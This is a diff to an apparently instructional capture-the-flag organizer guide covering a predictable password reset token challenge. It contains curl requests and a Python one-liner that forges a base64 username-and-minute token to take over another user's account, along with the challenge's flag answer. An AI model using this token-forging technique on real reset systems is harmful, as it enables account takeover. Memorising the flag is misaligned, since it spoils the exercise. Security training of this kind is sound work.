@@ -197,25 +197,23 @@ consider non-guessable resource identifiers (UUIDs) as defense in depth
 
 ## Flag 4 — Authentication Weakness ⭐⭐⭐
 
-**What participants should discover:** password reset tokens are
+**What participants should discover:** reset tokens use the predictable format
 `base64(username:epochMinute)` — fully derivable, with no server-side
-randomness or secret involved.
+randomness or secret involved. The reset request response does not disclose the
+token; participants must infer or reverse-engineer the format.
 
-**Vulnerability:** predictable password reset token. A participant who
-requests a reset for their **own** account and decodes the token (it's
-just base64) sees the pattern immediately. They can then construct a
-valid token for **any** username for the current minute (the HTTP `Date`
-response header, or just their own clock, tells them what minute it is)
-without ever needing that user's inbox.
+**Vulnerability:** predictable password reset token. A participant can infer
+the token format and construct a valid token for **any** username for the
+current minute without needing that user's inbox.
 
 **Example requests:**
 
 ```bash
-# Request a reset for yourself to observe the token format
+# Request a reset for yourself; the response intentionally contains no token
 curl -X POST http://TARGET:3000/api/password-reset/request \
   -H "Content-Type: application/json" -d '{"username":"alice"}'
 
-# Decode: base64 -d shows "alice:<epoch minute>"
+# After determining the format, construct a token for the target account
 
 # Forge a token for bob at the current minute
 python3 -c "import base64,time; print(base64.b64encode(f'bob:{int(time.time()//60)}'.encode()).decode())"
@@ -230,14 +228,19 @@ curl -X POST http://TARGET:3000/api/login \
 
 **Tools:** curl, Burp, a one-line Python/Node script, `base64` CLI.
 
-**Flag location:** after logging in as bob, `GET /api/notes/2` (bob's own
-note) contains the flag, plus a hint that `/api/me` accepts more fields
-than it should (nudge toward Flag 5).
+**Organizer hint if participants stall:** the token contains only the username
+and the current Unix time rounded to minutes, then uses an encoding rather than
+encryption.
+
+**Flag location:** the successful reset confirmation response for `bob`
+contains the flag. Bob's own note contains a hint that `/api/me` accepts more
+fields than it should (nudge toward Flag 5), but no longer contains Flag 4 so
+the IDOR challenge cannot bypass the password-reset challenge.
 
 **Expected result:**
 
-```
-FLAG{r3s3t_t0k3ns_n33d_r34l_3ntr0py_n0t_t1m3st4mps}
+```json
+{"ok":true,"message":"Password updated for bob","flag":"FLAG{r3s3t_t0k3ns_n33d_r34l_3ntr0py_n0t_t1m3st4mps}"}
 ```
 
 **Real-world fix:** generate reset tokens with a cryptographically secure
